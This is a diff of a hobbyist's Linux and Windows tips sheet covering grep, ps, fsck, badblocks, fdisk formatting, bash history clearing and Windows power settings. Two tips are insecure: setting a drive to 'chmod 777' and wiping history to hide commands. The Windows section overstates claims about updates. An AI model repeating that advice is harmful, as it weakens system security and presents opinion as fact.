-|  _ \ / _ \ \___ \| |_| |
-| |_) / ___ \ ___) |  _  |
-|____/_/   \_\____/|_| |_|
--------------------------------------------------------------------
-Changing font in TTY - WARNING: MAY KILL KITTENS
-	To change the TTY font sudo dpkg-reconfigure console-setup
-	If you did this in TTY, the changes will happen immediately after you finish.
-	If you did not, open TTY and type "setupcon"
-
--------------------------------------------------------------------
-Filtering results
-You can use wildcards to filter results in "ls"
-For example, while in the Documents folder, you can see only PDF's by using:
-
-	ls *pdf
-
--------------------------------------------------------------------
-Brace Expansion
-Using brackets {} in a BASH statement allows you to make commands that run with different strings.
-For example, in the following command, md5sum is run on all images that end with jpg, JPG, png, and PNG.
-
-md5sum *.{jpg,JPG,png,PNG}
-
--------------------------------------------------------------------
-Printing Line Numbers on ls output
-	ls | cat -n
-
--------------------------------------------------------------------
-Clearing BASH History
-After a long time of using BASH, you get a history file that is HUGE! Mine can usually top out to 2000 commands within a week or two.
-But if there are some commands you don't want people to see, there are multiple ways to go about deleting them.
-
-To erase the history file completely and start over:
-	history -c && history -w
-To edit commands out of the history file
-	nano ~/.bash_history
-Then, save the file, and CLOSE the Terminal completely and reopen it.
+#	rsync -zvrdop --dry-run source destination
 
 
--------------------------------------------------------------------
-Force Login Shell in Terminal
-If a login shell is not an option on the Terminal settings (common in Konsole)
+#   _______             _______  _______  ______  __  __      ___ ___                                    __   ___ 
+#  |     __|.-----.    |    ___||     __||      ||  |/  |    |   |   |.-----..--.--..----..-----..-----.|  |.'  _|
+#  |    |  ||  _  |    |    ___||__     ||   ---||     <      \     / |  _  ||  |  ||   _||__ --||  -__||  ||   _|
+#  |_______||_____|    |___|    |_______||______||__|\__|      |___|  |_____||_____||__|  |_____||_____||__||__|  
+#                                                                                                                 
+If you want to reboot and have the computer perform an FSCK on the next reboot, then open the Terminal and type:
+#	sudo shutdown -rF now
+OR…
+#	cd; sudo touch /forcefsck
 
-Edit the Current Profile
-look for the login Command. It will likely look like
-	/bin/bash
-Edit that line to read
-	/bin/bash -l
+Of course, there are some situations where we have to use the command line tool to check our file system. For example, when using a headless system, when a Linux box fails to boot, or when I really want to show off my Linux kung-fu skills to friends.
+One thing to note before using FSCK: You need to unmount the file system being scanned using the ‘umount’ command. Fixing a mounted file system with FSCK could end up creating more damage than the original problem.
 
-This will force a login shell everytime the Terminal profile is opened.
+First: Locate the drive you are going to FSCK
+#	sudo fdisk -l
+Second: Unmount the drive (Replace /dev/??? with the correct address from step 1)
+#	sudo umount /dev/???
+Now start the FSCK (Replace /dev/??? with the correct address from step 1 and 2)
+#	sudo fsck -t ext4 /dev/???
+	
 
--------------------------------------------------------------------
-The GREP Manual
+#   ______            __      _______               __                            _______                     
+#  |   __ \.---.-..--|  |    |     __|.-----..----.|  |_ .-----..----..-----.    |     __|.----..---.-..-----.
+#  |   __ <|  _  ||  _  |    |__     ||  -__||  __||   _||  _  ||   _||__ --|    |__     ||  __||  _  ||     |
+#  |______/|___._||_____|    |_______||_____||____||____||_____||__|  |_____|    |_______||____||___._||__|__|
+#                                                                                                             
+To scan a computer for bad sectors, you can either use the Drive Utility tool or the badblocks Terminal command.
+First: Locate the drive you are going to FSCK
+#	sudo fdisk -l
+Now use the badblocks command (Replace /dev/sdb with the correct address from step 1)
+#	sudo badblocks -v /dev/sdb1
+After it has run, badblocks will display a report of the bad sectors of the hard drive. You have two options when you see bad blocks. You can either look for a new hard drive, or mark these sectors as unusable hard drive sectors.
+This involves two steps:
+First you have to write the location of the bad sectors to a flat file
+#	sudo badblocks /dev/sda > ~/bad-blocks
+After that, we need to feed the flat file into the FSCK command to mark these sectors as unusable
+#	sudo fsck -l bad-blocks /dev/sda
+
+
+#   _____              _    _                 __   _____           ______   ___   _____  _   _ 
+#  /  ___|            | |  (_)               /  | |____ |          | ___ \ / _ \ /  ___|| | | |
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| |     / /  ______  | |_/ // /_\ \\ `--. | |_| |
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |     \ \ |______| | ___ \|  _  | `--. \|  _  |
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_.___/ /          | |_/ /| | | |/\__/ /| | | |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\____/           \____/ \_| |_/\____/ \_| |_/
+#                                                                                              
+#                                                                                              
+
+
+#   _______  __                _______  ______  _______  ______      _______                              __ 
+#  |_     _||  |--..-----.    |     __||   __ \|    ___||   __ \    |   |   |.---.-..-----..--.--..---.-.|  |
+#    |   |  |     ||  -__|    |    |  ||      <|    ___||    __/    |       ||  _  ||     ||  |  ||  _  ||  |
+#    |___|  |__|__||_____|    |_______||___|__||_______||___|       |__|_|__||___._||__|__||_____||___._||__|
+#                                                                                                            
 To search for the given string within a single file
-        grep “literal_string” [filename]
+#	grep “literal_string” [filename]
 To search for a given string within multiple files
-        grep “literal_string” FILE_PATTERN
+#	grep “literal_string” FILE_PATTERN
 Case-insensitive search
-        grep -i “literal_string” [filename]
-        grep -i “string” FILE_PATTERN
+#	grep -i “literal_string” [filename]
+#	grep -i “string” FILE_PATTERN
 Regular expression search - This is very powerful feature, if you use regular expression correctly. In the following example, grep searches for all the pattern that starts with “lines” and ends with “empty” and has anything in between in the demo_file.
-        grep “lines.*empty” demo_file
+#	grep “lines.*empty” demo_file
 
 From the documentation of grep:
 A regular expression may be followed by one of several repetition operators:
@@ -560,163 +838,167 @@ A regular expression may be followed by one of several repetition operators:
 {n,m}   The preceding item is matched at least n times, but not more than m times.
 
 To search all files under the current directory and its subdirectory, use
-        grep -r
+#	grep -r
 When you want to display lines that do not match the search, invert the search with
-        grep -v
+#	grep -v
 Display the lines which do not match all the given patterns
-        grep -v -e “pattern” -e “pattern”
+#	grep -v -e “pattern” -e “pattern”
 Show line numbers and file names in results
-        grep -n -H
+#	grep -n -H
 
--------------------------------------------------------------------
-Finding out the Command behind an Alias
+
+#      __     __                                                                __                 
+#  .--|  |.--|  |    .-----..----..-----..-----..----..-----..-----..-----.    |  |--..---.-..----.
+#  |  _  ||  _  |    |  _  ||   _||  _  ||  _  ||   _||  -__||__ --||__ --|    |  _  ||  _  ||   _|
+#  |_____||_____|    |   __||__|  |_____||___  ||__|  |_____||_____||_____|    |_____||___._||__|  
+#                    |__|                |_____|                                                   
+Use pv to add a loading bar.
+#	sudo aptitude install pv
+Then use the following piped command:
+#	dd if=/path/to/source | pv | dd of=/path/to/write
+
+
+#   ______  __                          __                    _______  _______  ___ ___      _______                __   
+#  |      ||  |--..---.-..-----..-----.|__|.-----..-----.    |_     _||_     _||   |   |    |    ___|.-----..-----.|  |_ 
+#  |   ---||     ||  _  ||     ||  _  ||  ||     ||  _  |      |   |    |   |   \     /     |    ___||  _  ||     ||   _|
+#  |______||__|__||___._||__|__||___  ||__||__|__||___  |      |___|    |___|    |___|      |___|    |_____||__|__||____|
+#                               |_____|           |_____|                                                                
+To change the TTY font
+#	sudo dpkg-reconfigure console-setup
+If you did this in TTY, the changes will happen immediately after you finish.
+If you did not, open TTY and type 
+#	setupcon
+
+WARNING!! MAY KILL KITTENS!!
+Making changes this way can result in missing characters and unformatted text errors
+
+
+#   _______  __  __  __                     __                                        __  __          
+#  |    ___||__||  ||  |_ .-----..----.    |  |.-----.    .----..-----..-----..--.--.|  ||  |_ .-----.
+#  |    ___||  ||  ||   _||  -__||   _|    |  ||__ --|    |   _||  -__||__ --||  |  ||  ||   _||__ --|
+#  |___|    |__||__||____||_____||__|      |__||_____|    |__|  |_____||_____||_____||__||____||_____|
+#                                                                                                     
+You can use wildcards to filter results in "ls"
+For example, while in the Documents folder, you can see only PDF's by using:
+#	ls *pdf
+
+
+#   _____    __                    _______                   __                             __             __        
+#  |     |_ |__|.-----..-----.    |    |  |.--.--..--------.|  |--..-----..----..-----.    |__|.-----.    |  |.-----.
+#  |       ||  ||     ||  -__|    |       ||  |  ||        ||  _  ||  -__||   _||__ --|    |  ||     |    |  ||__ --|
+#  |_______||__||__|__||_____|    |__|____||_____||__|__|__||_____||_____||__|  |_____|    |__||__|__|    |__||_____|
+#                                                                                                                    
+Pipe the resulting info through cat and use the -n modifier
+#	ls | cat -n
+
+
+#   ______                                _______                                     __               
+#  |   __ \.----..---.-..----..-----.    |    ___|.--.--..-----..---.-..-----..-----.|__|.-----..-----.
+#  |   __ <|   _||  _  ||  __||  -__|    |    ___||_   _||  _  ||  _  ||     ||__ --||  ||  _  ||     |
+#  |______/|__|  |___._||____||_____|    |_______||__.__||   __||___._||__|__||_____||__||_____||__|__|
+#                                                        |__|                                          
+Using brackets {} in a BASH statement allows you to make commands that run with different strings.
+For example, in the following command, md5sum is run on all images that end with jpg, JPG, png, and PNG.
+#	md5sum *.{jpg,JPG,png,PNG}
+
+
+#   ______  __                      __                    ______  _______  _______  _______      _______  __         __                       
+#  |      ||  |.-----..---.-..----.|__|.-----..-----.    |   __ \|   _   ||     __||   |   |    |   |   ||__|.-----.|  |_ .-----..----..--.--.
+#  |   ---||  ||  -__||  _  ||   _||  ||     ||  _  |    |   __ <|       ||__     ||       |    |       ||  ||__ --||   _||  _  ||   _||  |  |
+#  |______||__||_____||___._||__|  |__||__|__||___  |    |______/|___|___||_______||___|___|    |___|___||__||_____||____||_____||__|  |___  |
+#                                             |_____|                                                                                  |_____|
+After a long time of using BASH, you get a history file that is HUGE! Mine can usually top out to 2000 commands within a week or two. But if there are some commands you don't want people to see, there are multiple ways to go about deleting them.
+
+To erase the history file completely and start over:
+#	history -c && history -w
+To edit commands out of the history file
+#	nano ~/.bash_history
+The GREP ManualThen, save the file, and CLOSE the Terminal completely and reopen it.
+
+
+#   _______                                _____                  __             _______  __            __  __ 
+#  |    ___|.-----..----..----..-----.    |     |_ .-----..-----.|__|.-----.    |     __||  |--..-----.|  ||  |
+#  |    ___||  _  ||   _||  __||  -__|    |       ||  _  ||  _  ||  ||     |    |__     ||     ||  -__||  ||  |
+#  |___|    |_____||__|  |____||_____|    |_______||_____||___  ||__||__|__|    |_______||__|__||_____||__||__|
+#                                                         |_____|                                              
+If a login shell is not an option on the Terminal settings (common in Konsole)
+
+Edit the Current Profile and look for the login Command. It will likely look like
+#	/bin/bash
+Edit that line to read
+#	/bin/bash -l
+This will force a login shell everytime the Terminal profile is opened.
+
+
+#   ________  __            __    __             _______  __            __        _______  __  __                    _______                         _____ 
+#  |  |  |  ||  |--..---.-.|  |_ |  |.-----.    |_     _||  |--..---.-.|  |_     |   _   ||  ||__|.---.-..-----.    |   |   |.-----..---.-..-----.  |__   |
+#  |  |  |  ||     ||  _  ||   _| |_||__ --|      |   |  |     ||  _  ||   _|    |       ||  ||  ||  _  ||__ --|    |       ||  -__||  _  ||     |  ',  ,-'
+#  |________||__|__||___._||____|    |_____|      |___|  |__|__||___._||____|    |___|___||__||__||___._||_____|    |__|_|__||_____||___._||__|__|   |--|  
+#                                                                                                                                                    '--'  
 To figure out easily what the command is that is running behind an alias, use:
-	type [alias]
-	
-  ____ ____  _   _      __  __  __                                 
- / ___|  _ \| | | |    / / |  \/  | ___ _ __ ___   ___  _ __ _   _ 
-| |   | |_) | | | |   / /  | |\/| |/ _ \ '_ ` _ \ / _ \| '__| | | |
-| |___|  __/| |_| |  / /   | |  | |  __/ | | | | | (_) | |  | |_| |
- \____|_|    \___/  /_/    |_|  |_|\___|_| |_| |_|\___/|_|   \__, |
-                                                             |___/ 
--------------------------------------------------------------------
-See Available Memory
-To see more information on memory, open Terminal and type in the following command:
-	cat /proc/meminfo
+#	type [alias]
 
--------------------------------------------------------------------
-How I Use “Ps”
+
+#   _____              _    _                 __     ___            _____ ______  _   _           ___  ___                                     
+#  /  ___|            | |  (_)               /  |   /   |          /  __ \| ___ \| | | |   ___    |  \/  |                                     
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| |  / /| |  ______  | /  \/| |_/ /| | | |  ( _ )   | .  . |  ___  _ __ ___    ___   _ __  _   _ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | | / /_| | |______| | |    |  __/ | | | |  / _ \/\ | |\/| | / _ \| '_ ` _ \  / _ \ | '__|| | | |
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_\___  |          | \__/\| |    | |_| | | (_>  < | |  | ||  __/| | | | | || (_) || |   | |_| |
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/    |_/           \____/\_|     \___/   \___/\/ \_|  |_/ \___||_| |_| |_| \___/ |_|    \__, |
+#                                                                                                                                         __/ |
+#                                                                                                                                        |___/ 
+
+
+#   _______                __  __         __     __             _______                                      
+#  |   _   |.--.--..---.-.|__||  |.---.-.|  |--.|  |.-----.    |   |   |.-----..--------..-----..----..--.--.
+#  |       ||  |  ||  _  ||  ||  ||  _  ||  _  ||  ||  -__|    |       ||  -__||        ||  _  ||   _||  |  |
+#  |___|___| \___/ |___._||__||__||___._||_____||__||_____|    |__|_|__||_____||__|__|__||_____||__|  |___  |
+#                                                                                                     |_____|
+To see more information on memory, open Terminal and type in the following command:
+#	cat /proc/meminfo
+
+
+#   _______                       __               _______                                 
+#  |   |   |.-----..--.--.--.    |  |_ .-----.    |   |   |.-----..-----.    .-----..-----.
+#  |       ||  _  ||  |  |  |    |   _||  _  |    |   |   ||__ --||  -__|    |  _  ||__ --|
+#  |___|___||_____||________|    |____||_____|    |_______||_____||_____|    |   __||_____|
+#                                                                            |__|          
 ps displays information about a selection of the active processes.
 If you want a repetitive update of the selection and the displayed information, use "htop" or “top” instead. Or you can use the directions above to see memory infos.
 
 To see which programs are leaking
-	ps -eo rss,vsz,pid,cmd,cputime | sort -n | tail -20
+#	ps -eo rss,vsz,pid,cmd,cputime | sort -n | tail -20
 To list processes by % CPU usage
-	ps -eo pcpu,cpu,nice,state,cputime,args --sort pcpu | sed ‘/^0.0 /d’
+#	ps -eo pcpu,cpu,nice,state,cputime,args --sort pcpu | sed ‘/^0.0 /d’
 To list processes by %mem
-	ps -eo args,%cpu,%mem --sort +%mem
+#	ps -eo args,%cpu,%mem --sort +%mem
 To figure out when processes were started
-	ps -eo lstart
+#	ps -eo lstart
 To list processes in a hierarchy, tree format
-	ps -eo pid,args --forest
+#	ps -eo pid,args --forest
 To list all threads in a particular process
-	ps -C [process] -L -o pid,tid,pcpu,state
+#	ps -C [process] -L -o pid,tid,pcpu,state
 
- ____       _             __  __                                                   _   
-|  _ \ _ __(_)_   _____  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
-| | | | '__| \ \ / / _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
-| |_| | |  | |\ V /  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
-|____/|_|  |_| \_/ \___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
-                                                   |___/                               
--------------------------------------------------------------------
-All About FSCK (Go FSCK Yourself)
-If you want to reboot and have the computer perform an FSCK on the next reboot, then open the Terminal and type:
-	sudo shutdown -rF now
-OR…
-	cd; sudo touch /forcefsck
 
-Of course, there are some situations where we have to use the command line tool to check our file system. For example, when using a headless system, when a Linux box fails to boot, or when I really want to show off my Linux kung-fu skills to friends.
+#   _____              _    _                 __   _____            _      _                      ______        _                   
+#  /  ___|            | |  (_)               /  | |  ___|          | |    (_)                     |  _  \      (_)                  
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | |___ \   ______  | |     _  _ __   _   _ __  __ | | | | _ __  _ __   __  ___  ___ 
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | |     \ \ |______| | |    | || '_ \ | | | |\ \/ / | | | || '__|| |\ \ / / / _ \/ __|
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_/\__/ /          | |____| || | | || |_| | >  <  | |/ / | |   | | \ V / |  __/\__ \
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\____/           \_____/|_||_| |_| \__,_|/_/\_\ |___/  |_|   |_|  \_/   \___||___/
+#                                                                                                                                   
+#                                                                                                                                   
 
-One thing to note before using FSCK: You need to unmount the file system being scanned using the ‘umount’ command. Fixing a mounted file system with FSCK could end up creating more damage than the original problem.
 
-First: Locate the drive you are going to FSCK
-	sudo fdisk -l
-Second: Unmount the drive (Replace /dev/sdb with the correct address from step 1)
-	sudo umount /dev/sdb
-Now start the FSCK (Replace /dev/sdb with the correct address from step 1 and 2)
-	sudo fsck -t ext4 /dev/sdb
-	
--------------------------------------------------------------------
-Scan a drive for bad sectors
-To scan a computer for bad sectors, you can either use the Drive Utility tool or the badblocks Terminal command.
-First: Locate the drive you are going to FSCK
-	sudo fdisk -l
-Now use the badblocks command (Replace /dev/sdb with the correct address from step 1)
-	sudo badblocks -v /dev/sdb1
-After it has run, badblocks will display a report of the bad sectors of the hard drive. You have two options when you see bad blocks. You can either look for a new hard drive, or mark these sectors as unusable hard drive sectors.
-This involves two steps:
-First you have to write the location of the bad sectors to a flat file
-	sudo badblocks /dev/sda > ~/bad-blocks
-After that, we need to feed the flat file into the FSCK command to mark these sectors as unusable
-	sudo fsck -l bad-blocks /dev/sda
-
--------------------------------------------------------------------
-Tweaking Things in GRUB - WARNING: CAN KILL KITTENS
-Your GRUB settings are stored in. This is the file you edit to change GRUB settings.
-	/etc/default/grub
-
-Scripts are located in: Be careful editing or changing any scripts here. Serious system damage can result.
-	/etc/grub.d/
-
-After editing things, run the command
-	update-grub
-This makes GRUB automatically combines the settings from the /etc/default/grub, the scripts from the /etc/grub.d/, and creates a /boot/grub/grub.cfg file that’s read at boot.
-If necessary, it is possible to edit this final file, but be very careful.
-
--------------------------------------------------------------------
-Recovering GRUB
-Boot into your Linux LiveCD (best to use the same version as the one you are recovering).
-Open Terminal and type:
-	sudo fdisk -l
-Under this list you can see which one is the Linux Mint partition. It’s usually /dev/sda1/ unless you are dual-booting.
-You need to mount the Linux Mint partition so you can access it. To do this, type:
-	sudo mount /dev/sdXY /mnt
-	(Replace X with the correct letter, and Y with the correct number)
-Now you need to tell Linux Mint to install grub2 to the partition you just mounted. To do this, type:
-	sudo grub-install --root-directory=/mnt/ /dev/sdX
-	(replace X with correct letter)
-(It is IMPORTANT that you do NOT enter any number, just the letter of the partition)
-Now reboot the computer. You should see a GRUB menu pop up when the reboot is done. If you are dual-booting you may need to refresh GRUB so it detects any Windows partitions. To do this, log in, and open a Terminal and type:
-	sudo update-grub
-		
--------------------------------------------------------------------
-How to Fix Broken Package Headers that Prevent Updating
-Occasionally I’ve noticed that the Package Manager in Mint will encounter an odd error. It will display a broken symbol and apt-get update will generate a message like this:
-	Reading package lists... Error!
-	E: Encountered a package list with no Package: header
-	E: Problem with MergeList /var/lib/apt/lists/mirror.umd.edu_linuxmint_packages_dists_nadia_import_i18n_Translation-en
-Going in the help room was no help, because they told me I must have screwed up my install somehow. However this has occasionally happened to me on a fresh install. So I hunted for the solution. Finally figured it out.
-Open two Terminals side-by-side.
-In one Terminal, duplicate the error by typing
-	sudo apt-get update
-It will download all the lists and error out.
-In the other Terminal go to the folder location mentioned in the error:
-	cd /var/lib/apt/lists/
-In that folder there are lots of MergeLists, one or more of which is borked (could be more than one, but you’ll only get one error at a time). You will lose nothing by deleting these MergeLists, because they will be completely restored and functional on a new apt-get update. So, I start by axing all the files that broadly match the error file:
-	sudo rm mirror.umd.edu*
-After that’s done, switch to the other Terminal and type
-	sudo apt-get update
-Let it update. If you encounter another error, switch to the other Terminal and axe some more MergeLists. Otherwise the error should go away once the MergeLists have been refreshed.
-
--------------------------------------------------------------------
-How to Unlock DPKG
-If you start installing a package, and for whatever reason have to abort the install it will most likely lock up dpkg and you’ll be unable to install anything else until the installation you just started is finished. This can be rough if the package in question won’t install for some reason.
-Sometimes dpkg can get locked because the xapian-index is out of date. Update it and see if this clears the lock.
-	sudo update-apt-xapian-index  --force
-If that doesn’t work, figure out which program has executed a lock on dpkg:
-	sudo fuser -vvv /var/lib/dpkg/lock
-	sudo fuser -vvv /var/lib/apt/lists/lock
-	sudo fuser -vvv /var/cache/apt/archives/lock
-You can also use fuser to figure out other locks by substituting the lock location in the above command.
-	sudo fuser -vvv /location/location/location
-You can kill those programs individually by executing a kill on their PID
-	kill [pid number of dpkg lock]
-If all else fails, just delete the lock files:
-	sudo rm -fv /var/lib/apt/lists/lock
-	sudo rm -fv /var/lib/dpkg/lock
-	sudo rm -fv /var/cache/apt/archives/lock
-Then to stop dpkg from trying to install the same package again.
-	sudo dpkg -r [name of package you don’t want installing again]
-	sudo dpkg --configure -a
-It will remove the package from the cache and install any other packages held because of the broken package was lagging the install.
-
--------------------------------------------------------------------
-Formatting External Drive to EXT4
-
+#   _______                                __        _____         __                    __               _______  ___ ___  _______  _____  
+#  |    ___|.-----..----..--------..---.-.|  |_     |     \ .----.|__|.--.--..-----.    |  |_ .-----.    |    ___||   |   ||_     _||  |  | 
+#  |    ___||  _  ||   _||        ||  _  ||   _|    |  --  ||   _||  ||  |  ||  -__|    |   _||  _  |    |    ___||-     -|  |   |  |__    |
+#  |___|    |_____||__|  |__|__|__||___._||____|    |_____/ |__|  |__| \___/ |_____|    |____||_____|    |_______||___|___|  |___|     |__| 
+#                                                                                                                                           
 Check the drive partition status in FDisk
-	sudo fdisk -l
+#	sudo fdisk -l
 If needed, delete old partitions and set up a new partition in FDisk
-	sudo fdisk /dev/sdb
+#	sudo fdisk /dev/sdb
 This brings up the FDisk menu, which can be complicated at times.
 Command action
 	a   toggle a bootable flagL
@@ -742,148 +1024,140 @@ Here's how I use FDisk.
 Listing partitions on disk, press "p". To create new ones press "n" (probably after deleting one or more partitions by pressing "d"). Finally, press "w" to write the changes to the disk
 
 After that is done, you actually need to format the new partition to EXT4.
-	sudo mkfs.ext4 /dev/sdbX
+#	sudo mkfs.ext4 /dev/sdbX
 
 You will probably notice that the drive won't allow you to add/remove any files even after the format.
 Find the mountpoint of the drive using
-	lsblk
+#	lsblk
 You'll see the mountpoint listed next to the drive entry like below:
 sdb1      8:16   1   7.4G  0 disk /media/user/location
 
 So navigate to the actual drive location
-	cd /media/user
-	ls -al
+#	cd /media/user
+#	ls -al
 That will probably show that the drive is owned by root:root and cannot be written to. Use the following commands to take control of the drive.
-	chown username:username /media/location
-	chmod 777 /media/location
+#	chown username:username /media/location
+#	chmod 777 /media/location
 This will change the device to read/write/execute, and it will be owned by the correct user. You can now write to the drive.
-__        ___           _                     ____       _             __  __                                                   _   
-\ \      / (_)_ __   __| | _____      _____  |  _ \ _ __(_)_   _____  |  \/  | __ _ _ __   __ _  __ _  ___ _ __ ___   ___ _ __ | |_ 
- \ \ /\ / /| | '_ \ / _` |/ _ \ \ /\ / / __| | | | | '__| \ \ / / _ \ | |\/| |/ _` | '_ \ / _` |/ _` |/ _ \ '_ ` _ \ / _ \ '_ \| __|
-  \ V  V / | | | | | (_| | (_) \ V  V /\__ \ | |_| | |  | |\ V /  __/ | |  | | (_| | | | | (_| | (_| |  __/ | | | | |  __/ | | | |_ 
-   \_/\_/  |_|_| |_|\__,_|\___/ \_/\_/ |___/ |____/|_|  |_| \_/ \___| |_|  |_|\__,_|_| |_|\__,_|\__, |\___|_| |_| |_|\___|_| |_|\__|
-                                                                                                |___/                               
--------------------------------------------------------------------
-Disable UEFI and Secure Boot on Windows 8/10.
 
-This was done on a DELL Inspiron 3646. It will be a similar method on other computers.
-Power down computer. Power up. Hit F2 as soon as computer boots up to get to UEFI control screen.
+
+#   _____              _    _                 __    ____            _    _  _             _                         __   _____ 
+#  /  ___|            | |  (_)               /  |  / ___|          | |  | |(_)           | |                       /  | |  _  |
+#  \ `--.   ___   ___ | |_  _   ___   _ __   `| | / /___   ______  | |  | | _  _ __    __| |  ___  __      __ ___  `| | | |/' |
+#   `--. \ / _ \ / __|| __|| | / _ \ | '_ \   | | | ___ \ |______| | |/\| || || '_ \  / _` | / _ \ \ \ /\ / // __|  | | |  /| |
+#  /\__/ /|  __/| (__ | |_ | || (_) || | | | _| |_| \_/ |          \  /\  /| || | | || (_| || (_) | \ V  V / \__ \ _| |_\ |_/ /
+#  \____/  \___| \___| \__||_| \___/ |_| |_| \___/\_____/           \/  \/ |_||_| |_| \__,_| \___/   \_/\_/  |___/ \___/ \___/ 
+#                                                                                                                              
+#                                                                                                                              
+
+
+#   _______  __     __             __             ________  __                _______      _______                    _____    __                      
+#  |_     _||  |--.|__|.-----.    |__|.-----.    |  |  |  ||  |--..--.--.    |_     _|    |   |   |.-----..-----.    |     |_ |__|.-----..--.--..--.--.
+#    |   |  |     ||  ||__ --|    |  ||__ --|    |  |  |  ||     ||  |  |     _|   |_     |   |   ||__ --||  -__|    |       ||  ||     ||  |  ||_   _|
+#    |___|  |__|__||__||_____|    |__||_____|    |________||__|__||___  |    |_______|    |_______||_____||_____|    |_______||__||__|__||_____||__.__|
+#                                                                 |_____|                                                                              
+
+WARNING!! WINDOWS 10 KILLS KITTENS EVERY TIME YOU USE IT!!
+SAVE THE KITTENS!! BE A SMART LINUX USER!!
+
+#Windows Update Ruins Lives
+The way Windows Update currently forces Windows 10 upgrades and updates on you is bad.
+
+If Windows Update wants to do its thing, it is going to get on with it - regardless of what you might be doing, sometimes without letting users complete the task they were engaged with.
+Loss of data is common, usually because the computer will suddenly restart with no warning.
+
+Sometimes Windows Update can't finish an update, and it can't rollback the system to a safe point either, which leaves the entire system in an unusable state.
+This can leave you stranded without a working computer for hours or days before you can get it fixed, IF it can even be fixed.
+
+The most common piece of advice on Windows forums when dealing with huge bugs is "Just format the hard drive and start over."
+
+THE ONLY WAY TO STOP WINDOWS 10 UPDATES IS TO NOT CONNECT THE COMPUTER TO WIFI
+
+It is not unusual for Windows Update to sabotage the bootloader and make a computer unbootable without serious software repair.
+
+
+#   _____   __                __     __             _______  _______  _______  _______         ___     _______                                       ______                __   
+#  |     \ |__|.-----..---.-.|  |--.|  |.-----.    |   |   ||    ___||    ___||_     _|       /  /    |     __|.-----..----..--.--..----..-----.    |   __ \.-----..-----.|  |_ 
+#  |  --  ||  ||__ --||  _  ||  _  ||  ||  -__|    |   |   ||    ___||    ___| _|   |_      ,' ,'     |__     ||  -__||  __||  |  ||   _||  -__|    |   __ <|  _  ||  _  ||   _|
+#  |_____/ |__||_____||___._||_____||__||_____|    |_______||_______||___|    |_______|    /__/       |_______||_____||____||_____||__|  |_____|    |______/|_____||_____||____|
+#                                                                                                                                                                               
+It will be a similar method on other computers.
+Power down computer.
+Power up.
+Hit F2 as soon as computer boots up to get to UEFI control screen.
 Use arrows to navigate to Boot Options
 
 In options should be option for Secure Boot
 
 Set Secure Boot to Disabled
 
-Press F10 to save settings. Reboot.
+Press F10 to save settings.
+Reboot.
 
--------------------------------------------------------------------
-Drive Won't Mount In Linux
 
-If you need to save Windows, and transfer files from a drive to Windows, but the drive won't mount while using a LiveDVD, boot back into Windows.
+#   ________  __            __                              ______                                    _______         __    __    __                      
+#  |  |  |  ||__|.-----..--|  |.-----..--.--.--..-----.    |   __ \.-----..--.--.--..-----..----.    |     __|.-----.|  |_ |  |_ |__|.-----..-----..-----.
+#  |  |  |  ||  ||     ||  _  ||  _  ||  |  |  ||__ --|    |    __/|  _  ||  |  |  ||  -__||   _|    |__     ||  -__||   _||   _||  ||     ||  _  ||__ --|
+#  |________||__||__|__||_____||_____||________||_____|    |___|   |_____||________||_____||__|      |_______||_____||____||____||__||__|__||___  ||_____|
+#                                                                                                                                           |_____|       
 
-Go to Control Panel > Hardware > Power Options
-You're looking for a setting that says "Change What the Power Buttons do"
+Windows PCs typically operate in a number of Advanced Configuration and Power Interface (ACPI) power states. An S0 power state, for example, is when your PC is running and ready to respond to your input.
+There are a number of power states, including S1, S2, and S3, and there's also a HYBRID SLEEP state where hibernation is used in tandem with a sleep state.
 
-Uncheck "Turn off Fast Startup"
+Hibernation is considered an S4 POWER STATE.
+While hibernating, your PC WILL SEEM LIKE it's completely off, but there will be a saved hibernation file ready to be used to boot back to where you were during your last user session.
+Some power is usually still routed to peripherals so that you can, say, tap your keyboard and have the PC boot.
 
-Reboot. Now Windows will REALLY shutdown and not hibernate!
+An S5 power state (soft off) is when your PC is shut down and rebooted completely. There's no hibernation file and no saved user session. S5 is usually used during Windows Update.
 
-The drives should be unlocked in a LiveDVD
+There is also a G3 power state, which is when your PC consumes absolutely no power and is by all means off.
 
--------------------------------------------------------------------
-Another Windows Fix for Locked Drives
-Always try the above fix first.
+
+#   _____         __                    ________                __  __        _______                       __        __             _____    __                      
+#  |     \ .----.|__|.--.--..-----.    |  |  |  |.-----..-----.|  ||  |_     |   |   |.-----..--.--..-----.|  |_     |__|.-----.    |     |_ |__|.-----..--.--..--.--.
+#  |  --  ||   _||  ||  |  ||  -__|    |  |  |  ||  _  ||     | |_||   _|    |       ||  _  ||  |  ||     ||   _|    |  ||     |    |       ||  ||     ||  |  ||_   _|
+#  |_____/ |__|  |__| \___/ |_____|    |________||_____||__|__|    |____|    |__|_|__||_____||_____||__|__||____|    |__||__|__|    |_______||__||__|__||_____||__.__|
+#                                                                                                                                                                     
+The only way that Linux can easily access files on a Windows hard drive is if the computer turns off completely and doesn't leave the drive partially hibernating.
+
+This is especially annoying if you're trying to rescue files from a hard drive that Windows has corrupted. And you try to mount the drive, and it won't mount!
+
+IF YOU CAN BOOT INTO WINDOWS... go to
+#	Control Panel > Hardware > Power Options
+Look around for the setting that says
+#	"Change What The Power Button Does"
+Make sure the Power Button is not set to "Sleep". Change it to "Shut Down"
+Then click on
+#	"Change Settings that are Currently Unavailable"
+#	Click "Turn on fast startup (recommended)" so that the checkmark disappears.
+Reboot.
+Now Windows will REALLY shutdown and not hibernate!
+#	Make sure you check this from time to time because Windows Update loves turning this setting back on.
+
